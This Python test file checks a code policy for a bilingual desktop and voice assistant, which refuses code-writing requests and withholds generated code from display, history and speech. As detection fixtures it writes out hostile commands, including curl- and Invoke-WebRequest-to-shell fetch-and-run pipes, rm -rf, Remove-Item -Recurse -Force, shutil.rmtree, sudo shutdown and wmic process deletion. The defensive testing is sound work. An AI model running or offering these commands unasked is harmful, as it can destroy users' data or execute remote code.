"""The chat's code boundary: requests to write, change or run code are refused before any Brain, and a
generated answer containing code is never recorded, shown or spoken. Read-only code analysis stays permitted
(docs/qronos_voice_output.md; security/permissions.py CODE_ANALYSIS is AUTO_ALLOW).

No model runs: the "Brain" is a recorder standing in for the orchestrator's step execution, the voice turn uses the
existing fake audio/STT/TTS of tests/test_runtime_bridge.
"""
from __future__ import annotations

import inspect
import json
from types import SimpleNamespace

import pytest

from core import code_policy
from core.action_audit import ActionAuditLog, AuditEvent
from core.orchestrator import Orchestrator, StepResult
from core.task_plan import TaskPlan
from core.task_router import TaskType
from security.permissions import ActionCategory

GEN, MOD, RUN = ActionCategory.CODE_GENERATION, ActionCategory.CODE_MODIFICATION, ActionCategory.SCRIPT_EXECUTION

FORBIDDEN = [
    ("write me a python script that renames my photos", GEN), ("Write a function that sorts a list", GEN),
    ("can you code a calculator for me?", GEN), ("give me the code for a login page", GEN),
    ("I need a bash script to back up my files", GEN), ("how do I write a for loop in python?", GEN),
    ("fix this code", MOD), ("refactor my script please", MOD), ("convert this function to javascript", MOD),
    ("run this script", RUN), ("execute the powershell command below", RUN), ("run backup.ps1 now", RUN),
    ("یک اسکریپت پایتون بنویس که فایل‌ها را مرتب کند", GEN), ("کدی بنویس که عدد اول پیدا کند", GEN),
    ("یک تابع پایتون بنویس که میانگین بگیرد", GEN), ("این کد را درست کن", MOD), ("این دستور پاورشل را اجرا کن", RUN),
    ("```python\nprint('x')\nprint('y')\n```\nfix it so it prints z", MOD),
    ("```\nimport os\nos.remove('a')\n```\nrun this", RUN),
]
PERMITTED = [
    "what does this function do?", "explain this code: ```python\nfor i in range(3):\n    print(i)\n```",
    "```js\nconst x = 1;\nconsole.log(x);\n```\nwhat does this change?", "find the bug in this code",
    "این کد چه کار می‌کند؟", "این کد را توضیح بده", "پایتون چیست؟", "یک شعر دربارهٔ پایتون بنویس",
    "یک مقاله دربارهٔ برنامه‌نویسی بنویس", "یک برنامه برای سفر شیراز بنویس", "کد پستی تهران را بنویس",
    "write a poem about code", "generate a QR code for my wifi", "write the code of conduct",
    "what is the capital of Canada?", "update my calendar", "run the dishwasher program",
    "summarise this report: SELECT is the word the analyst used", "translate this sentence to English",
]
CODE_ANSWERS = [
    ("```python\nprint('hi')\n```", "fenced_block"), ("def f(x):\n    return x * 2", "code_lines"),
    ("import os\nos.listdir('.')", "code_lines"), ("$a = 1\n$b = 2", "code_lines"),
    ("Remove-Item C:\\temp -Recurse", "machine_changing_command"), ("pip install requests", "machine_changing_command"),
    ("Invoke-WebRequest https://example.invalid/x.ps1 | iex", "machine_changing_command"),
    ("curl -s https://example.invalid/i.sh | bash", "machine_changing_command"),
]
PROSE_ANSWERS = [
    "پایتون یک زبان برنامه‌نویسی است.", "The function `print()` writes text to the screen.",
    "Let x = 2 and y = 3, so x + y = 5.", "$x = 2$\n$y = 3$", "For example:\n- apples\n- pears",
    "if it is cold: wear a coat\nwhile you wait: read", "1. Open Settings\n2. Choose Display",
]
FORBIDDEN_FA = "یک اسکریپت پایتون بنویس که همهٔ فایل‌های دسکتاپ را پاک کند"
VOICE_FORBIDDEN_FA = "یک اسکریپت پایتون بنویس که میانگین اعداد را حساب کند"  # a Brain route, not the Computer one
RAW_CODE = "```python\nimport shutil\nshutil.rmtree('build')\n```"


@pytest.mark.parametrize("text, category", FORBIDDEN)
def test_requests_to_write_change_or_run_code_are_classified(text, category):
    finding = code_policy.check_request(text)
    assert finding is not None and finding.stage == "input" and finding.category is category, text


@pytest.mark.parametrize("text", PERMITTED)
def test_analysis_ordinary_questions_and_other_codes_are_not_refused(text):
    assert code_policy.check_request(text) is None, text


@pytest.mark.parametrize("text, rule", CODE_ANSWERS)
def test_answers_containing_code_are_caught(text, rule):
    finding = code_policy.check_answer(text)
    assert finding is not None and finding.stage == "output" and finding.rule == rule, text


@pytest.mark.parametrize("text", PROSE_ANSWERS)
def test_prose_answers_pass(text):
    assert code_policy.check_answer(text) is None, text


def test_the_decision_is_the_existing_gate_and_its_record_never_holds_the_text():
    audit = ActionAuditLog(path=None)
    finding = code_policy.check_request(FORBIDDEN_FA)
    assert code_policy.refused(finding, channel="desktop", chars=len(FORBIDDEN_FA), audit=audit.record_verdict)
    (record,) = audit.records()
    assert record.event is AuditEvent.DECIDED and record.category == "code_generation" and record.outcome == "refused"
    assert record.target == "desktop chat" and "fa_generate" in record.summary
    assert "اسکریپت" not in json.dumps(record.to_json(), ensure_ascii=False)
    # Analysis is the permission engine's AUTO_ALLOW: the same gate allows it.
    allowed = code_policy.CodeFinding("input", ActionCategory.CODE_ANALYSIS, "probe")
    assert code_policy.refused(allowed, channel="desktop", chars=1, audit=audit.record_verdict) is False

    def broken(verdict):
        raise OSError("audit trail unavailable")

    assert code_policy.refused(finding, channel="desktop", chars=1, audit=broken) is True  # fails closed


# ------------------------------------------------------------------ the orchestrator boundary (desktop text/voice/queue)

class Brain:
    """Stands for everything a step runs (resource admission, model call): records every call."""

    def __init__(self, output: str) -> None:
        self.output = output
        self.calls: list[str] = []  # activity/resource checks and steps: the path to a model
        self.syncs = 0  # resident-model bookkeeping (also done by the voice turn's own Brain release)


def guarded_orchestrator(brain: Brain, audit=None) -> Orchestrator:
    guard = SimpleNamespace(detect=lambda: brain.calls.append("detect") or SimpleNamespace(mode=None, resource_pressure=None))
    # The voice turn releases the Brains before speaking (an unload request, not a model call): a no-op here.
    manager = SimpleNamespace(unload_qronos_models=lambda *args, **kwargs: False)
    orchestrator = Orchestrator(runtime=SimpleNamespace(), model_manager=manager, activity_guard=guard,
                                telemetry=SimpleNamespace(current=lambda: None, invalidate=lambda: None))

    def sync() -> None:
        brain.syncs += 1

    orchestrator._sync_resident_brain_ownership = sync

    def execute_step(*, step, **kwargs):
        brain.calls.append(step.description)
        return StepResult(order=step.order, success=True, output=brain.output)

    orchestrator._execute_step = execute_step
    orchestrator.code_policy_audit = audit
    return orchestrator


def plan_of(text: str, task_type: TaskType = TaskType.FAST) -> TaskPlan:
    plan = TaskPlan(goal=text)
    plan.add_step(task_type=task_type, description=text)
    return plan


def test_a_forbidden_request_is_refused_before_any_resource_check_or_model_call():
    brain, audit = Brain("never"), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of(FORBIDDEN_FA))
    assert result.success and result.output == code_policy.INPUT_REFUSAL_FA
    assert brain.calls == [] and brain.syncs == 0  # no bookkeeping, no activity/resource check, no step, no model
    assert [r.category for r in audit.records()] == ["code_generation"]


def test_generated_code_is_replaced_before_it_leaves_the_orchestrator_and_prose_passes():
    brain, audit = Brain(RAW_CODE), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of("پایتون چیست؟"))
    assert brain.calls == ["detect", "پایتون چیست؟"] and brain.syncs == 1
    assert result.output == code_policy.OUTPUT_REFUSAL_FA and "shutil" not in result.output
    assert [(r.category, r.outcome) for r in audit.records()] == [("code_generation", "refused")]
    prose = Brain("پایتون یک زبان برنامه‌نویسی است.")
    (kept,) = guarded_orchestrator(prose).execute_plan(plan_of("پایتون چیست؟"))
    assert kept.output == "پایتون یک زبان برنامه‌نویسی است."


def test_read_only_code_analysis_reaches_the_brain_unchanged():
    asked = "explain this code: ```python\nfor i in range(3):\n    print(i)\n```"
    brain, audit = Brain("It prints the numbers 0, 1 and 2, one per line."), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of(asked, TaskType.HEAVY))
    assert brain.calls[-1] == asked and result.output == brain.output and audit.records() == ()


# ------------------------------------------------------------------ the desktop text turn

def text_runtime(brain: Brain):
    from core.runtime_bridge import QronosRuntime
    from tests.test_text_chat_bridge import FakeRouter
    from test_file_control_text_bridge import _FakeHistory

    events: list = []
    runtime = QronosRuntime(notify=lambda event, status, message: events.append((event, status, message)))
    runtime.task_router = FakeRouter(TaskType.FAST)
    runtime.conversation_history = _FakeHistory()
    runtime.action_audit = ActionAuditLog(path=None)
    runtime.orchestrator = guarded_orchestrator(brain, runtime._code_policy_audit)
    return runtime, events


def test_desktop_text_turn_refuses_input_without_a_model_and_never_shows_generated_code():
    brain = Brain("never")
    runtime, events = text_runtime(brain)
    runtime.run_text_turn(FORBIDDEN_FA, "req-1")
    response = [json.loads(m) for e, _, m in events if e == "text_response"][-1]
    assert response["text"] == code_policy.INPUT_REFUSAL_FA and brain.calls == []
    assert [r.category for r in runtime.action_audit.records()] == ["code_generation"]

    brain = Brain(RAW_CODE)
    runtime, events = text_runtime(brain)
    runtime.run_text_turn("پایتون چیست؟", "req-2")
    response = [json.loads(m) for e, _, m in events if e == "text_response"][-1]
    assert response["text"] == code_policy.OUTPUT_REFUSAL_FA
    assert "shutil" not in json.dumps(events, ensure_ascii=False)  # no raw generated code in any event
    assert all("shutil" not in m.text for m in runtime.conversation_history.messages)  # nor in the history


# ------------------------------------------------------------------ the voice turn (fake audio, STT and TTS)

def voice_turn(transcript: str, brain: Brain, tmp_path):
    from tests.test_runtime_bridge import FakeSpeechRuntime, captured_events, prepared_runtime

    runtime = prepared_runtime(speech=FakeSpeechRuntime(transcript=transcript, temp_dir=tmp_path))
    assert runtime.task_router.route(transcript).task_type in (TaskType.FAST, TaskType.HEAVY)  # a Brain route
    runtime.orchestrator = guarded_orchestrator(brain, runtime._code_policy_audit)
    runtime.conversation_session.start()
    runtime._warm_speech_runtime_async = lambda: None
    runtime._write_latency_report = lambda payload: None
    events = captured_events(lambda: runtime._run_voice_turn(trigger_source="wake_word"))
    spoken = [e["message"] for e in events if e["eventType"] == "voice_response"]
    return runtime, events, spoken


def test_voice_turn_speaks_only_the_refusal(tmp_path):
    brain = Brain("never")
    runtime, events, spoken = voice_turn(VOICE_FORBIDDEN_FA, brain, tmp_path)
    assert spoken == [code_policy.INPUT_REFUSAL_FA] and brain.calls == []
    assert "".join(runtime.voice_output.calls).replace(" ", "") and "اسکریپت" not in "".join(runtime.voice_output.calls)

    brain = Brain(RAW_CODE)
    runtime, events, spoken = voice_turn("پایتون چیست؟", brain, tmp_path)
    assert spoken == [code_policy.OUTPUT_REFUSAL_FA]
    tts = "".join(runtime.voice_output.calls)
    assert tts and "shutil" not in tts and "rmtree" not in tts  # nothing generated reached the voice
    assert "shutil" not in json.dumps(events, ensure_ascii=False)


def test_every_production_orchestrator_is_given_the_audit_trail():
    from core import runtime_bridge

    source = inspect.getsource(runtime_bridge.QronosRuntime)
    assert source.count("code_policy_audit = self._code_policy_audit") == 2


# ------------------------------------------------------------------ one-line and in-sentence code

# Each answers an ordinary question the input layer admits; the raw command/statement must never be released.
B1_ANSWERS = {
    "inline_remove_item": ("To clean the folder, run `Remove-Item C:\\Temp\\* -Recurse -Force` in PowerShell.",
                           "machine_changing_command", "Remove-Item"),
    "inline_rm_rf": ("You can delete it with `rm -rf ~/old-project` and it is gone.", "machine_changing_command",
                     "rm -rf"),
    "after_colon_rm_rf": ("Run this: rm -rf ~/old-project", "machine_changing_command", "rm -rf"),
    "single_line_python": ("Use this line:\nimport shutil; shutil.rmtree('C:/old')", "single_code_line", "rmtree"),
    "single_line_print": ("Here is the code:\nprint('hello world')", "single_code_line", "print("),
}
B1_QUESTION = "how do I show hello world in python?"
# A command or statement named in words, explained, or warned about - and arithmetic, LaTeX, prose - is not code.
MENTIONS = [
    "Never run `rm -rf` on your home folder; it deletes everything.", "rm -rf is dangerous because it deletes everything.",
    "Remove-Item is the PowerShell cmdlet that deletes items.", "Sudo is a tool that runs a command as another user.",
    "pip install is how you add packages.", "x = 2", "Call os.listdir() to list the files in a folder.",
    "Note: the meeting is at 10:30. Bring the report.", "return to the main menu\nelse: nothing",
    "Get-Together tomorrow at noon.", "The function walks the list and prints each item; nothing is changed on disk.",
    "If x = 2 then x + 3 = 5.", "In LaTeX you write $x = 2$ for inline math.", "Your postal code is 12345.",
    "این دستور rm -rf همه چیز را پاک می‌کند، پس با احتیاط.", "این تابع هر عدد را دو برابر می‌کند و نتیجه را برمی‌گرداند.",
]


@pytest.mark.parametrize("name", sorted(B1_ANSWERS))
def test_b1_one_line_and_in_sentence_code_is_withheld(name):
    text, rule, _ = B1_ANSWERS[name]
    finding = code_policy.check_answer(text)
    assert finding is not None and finding.rule == rule, (name, finding)


@pytest.mark.parametrize("text", MENTIONS)
def test_b1_mentions_explanations_arithmetic_and_prose_still_pass(text):
    assert code_policy.check_answer(text) is None, text


@pytest.mark.parametrize("name", sorted(B1_ANSWERS))
def test_b1_answers_never_leave_the_orchestrator(name):
    text, _, raw = B1_ANSWERS[name]
    assert code_policy.check_request(B1_QUESTION) is None  # an ordinary question the input layer admits
    brain, audit = Brain(text), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of(B1_QUESTION))
    assert brain.calls[-1] == B1_QUESTION  # the Brain WAS asked: this is the output layer at work
    assert result.output == code_policy.OUTPUT_REFUSAL_FA and raw not in result.output
    assert [r.outcome for r in audit.records()] == ["refused"]


@pytest.mark.parametrize("name", sorted(B1_ANSWERS))
def test_b1_answers_are_not_shown_recorded_or_spoken(name, tmp_path):
    text, _, raw = B1_ANSWERS[name]
    runtime, events = text_runtime(Brain(text))
    runtime.run_text_turn(B1_QUESTION, "req-b1")
    response = [json.loads(m) for e, _, m in events if e == "text_response"][-1]
    assert response["text"] == code_policy.OUTPUT_REFUSAL_FA
    assert raw not in json.dumps(events, ensure_ascii=False)
    assert all(raw not in m.text for m in runtime.conversation_history.messages)
    runtime, voice_events, spoken = voice_turn("پایتون چیست؟", Brain(text), tmp_path)
    assert spoken == [code_policy.OUTPUT_REFUSAL_FA]
    tts = "".join(runtime.voice_output.calls)
    assert tts and raw not in tts and raw not in json.dumps(voice_events, ensure_ascii=False)


# ------------------------------------------------------------------ B1 follow-up: an ordinary-word target mid-clause,
# and an executable statement inside an inline `code span`

B1_FOLLOWUP = {
    "word_target_mid_clause": ("rm -rf node_modules and reinstall", "machine_changing_command", "node_modules"),
    "handed_over_mid_sentence": ("Delete it with rm -rf node_modules first.", "machine_changing_command",
                                 "node_modules"),
    "inline_call_span": ("use `print('x')` here", "inline_code_statement", "print('x')"),
    "inline_chain_span": ("Add `import os; os.remove(p)` to the top.", "inline_code_statement", "os.remove"),
}
FOLLOWUP_MENTIONS = [
    "Be careful with rm -rf because it cannot be undone.", "Using rm -rf carelessly is risky.",
    "rm -rf deletes everything.", "The rm -rf command deletes recursively.", "Type rm -rf only if you are sure.",
    "The `print` function writes text to the screen.", "`print()` writes text to the screen.",
    "Use the `os` module for paths.", "Keep `x = 5` in mind and add 3.", "The `Remove-Item` cmdlet deletes items.",
]


@pytest.mark.parametrize("name", sorted(B1_FOLLOWUP))
def test_b1_followup_variants_are_withheld(name):
    text, rule, _ = B1_FOLLOWUP[name]
    finding = code_policy.check_answer(text)
    assert finding is not None and finding.rule == rule, (name, finding)


@pytest.mark.parametrize("text", FOLLOWUP_MENTIONS)
def test_b1_followup_mentions_still_pass(text):
    assert code_policy.check_answer(text) is None, text


@pytest.mark.parametrize("name", sorted(B1_FOLLOWUP))
def test_b1_followup_variants_never_reach_any_output(name, tmp_path):
    text, _, raw = B1_FOLLOWUP[name]
    assert code_policy.check_request(B1_QUESTION) is None  # admitted: the Brain is asked, the output layer decides
    brain, audit = Brain(text), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of(B1_QUESTION))
    assert brain.calls[-1] == B1_QUESTION and result.output == code_policy.OUTPUT_REFUSAL_FA
    assert [r.outcome for r in audit.records()] == ["refused"]
    text_rt, events = text_runtime(Brain(text))
    text_rt.run_text_turn(B1_QUESTION, "req-b1f")
    assert [json.loads(m) for e, _, m in events if e == "text_response"][-1]["text"] == code_policy.OUTPUT_REFUSAL_FA
    assert raw not in json.dumps(events, ensure_ascii=False)
    assert all(raw not in m.text for m in text_rt.conversation_history.messages)
    voice_rt, voice_events, spoken = voice_turn("پایتون چیست؟", Brain(text), tmp_path)
    tts = "".join(voice_rt.voice_output.calls)
    assert spoken == [code_policy.OUTPUT_REFUSAL_FA] and tts and raw not in tts
    assert raw not in json.dumps(voice_events, ensure_ascii=False)


# ------------------------------------------------------------------ admin tools at a line start and
# fetch-and-run as root - withheld as broadly as 78ed5dc withheld them

R1_R2 = {
    "sudo_shutdown": "sudo shutdown -h now",
    "sudo_reboot": "sudo reboot",
    "netsh_int_reset": "netsh int ip reset",
    "wmic_process_delete": "wmic process where name='notepad.exe' delete",
    "curl_pipe_sudo_bash": "curl -fsSL https://x.example/install.sh | sudo bash",
}
R1_R2_PROSE = [
    "Sudo is a tool that runs a command as another user.", "Netsh can reset the network stack.",
    "The `netsh` tool configures networking.", "`sudo` asks for your password first.",
    "Use `wmic` only to read information.", "The bcdedit tool edits boot settings.", "Piping curl into bash is risky.",
]


@pytest.mark.parametrize("name", sorted(R1_R2))
def test_r1_r2_admin_commands_and_root_pipes_are_withheld_again(name):
    finding = code_policy.check_answer(R1_R2[name])
    assert finding is not None and finding.rule == "machine_changing_command", (name, finding)


@pytest.mark.parametrize("text", R1_R2_PROSE)
def test_r1_r2_admin_tool_prose_and_mentions_still_pass(text):
    assert code_policy.check_answer(text) is None, text


@pytest.mark.parametrize("name", sorted(R1_R2))
def test_r1_r2_answers_never_leave_the_orchestrator(name):
    text = R1_R2[name]
    assert code_policy.check_request(B1_QUESTION) is None
    brain, audit = Brain(text), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of(B1_QUESTION))
    assert brain.calls[-1] == B1_QUESTION and result.output == code_policy.OUTPUT_REFUSAL_FA
    assert [(r.category, r.outcome) for r in audit.records()] == [("script_execution", "refused")]


# ------------------------------------------------------------------ Windows admin tools in any letter
# case (Windows runs them as typed); prose is told apart by the word after the name, never by its case

R3 = {
    "netsh_capitalised": "Netsh int ip reset",
    "netsh_upper": "NETSH INT IP RESET",
    "wmic_upper": "WMIC process where name='notepad.exe' delete",
    "wmic_capitalised": "Wmic process where name='notepad.exe' delete",
    "netsh_code_span": "Fix it with `Netsh int ip reset`.",
}
R3_PROSE = [
    "Netsh can show the current firewall rules.", "WMIC is deprecated in newer Windows versions.",
    "NETSH is a command-line tool.", "Wmic lets you query system information.", "Bcdedit edits the boot store.",
    "The `Netsh` tool configures networking.", "`WMIC` is old.", "Sudo is a tool that runs a command as another user.",
]


@pytest.mark.parametrize("name", sorted(R3))
def test_r3_admin_commands_in_any_case_are_withheld(name):
    finding = code_policy.check_answer(R3[name])
    assert finding is not None and finding.rule == "machine_changing_command", (name, finding)


@pytest.mark.parametrize("text", R3_PROSE)
def test_r3_explanations_in_any_case_still_pass(text):
    assert code_policy.check_answer(text) is None, text


@pytest.mark.parametrize("name", sorted(R3))
def test_r3_answers_never_leave_the_orchestrator(name):
    text = R3[name]
    brain, audit = Brain(text), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of(B1_QUESTION))
    assert brain.calls[-1] == B1_QUESTION and result.output == code_policy.OUTPUT_REFUSAL_FA
    assert [(r.category, r.outcome) for r in audit.records()] == [("script_execution", "refused")]
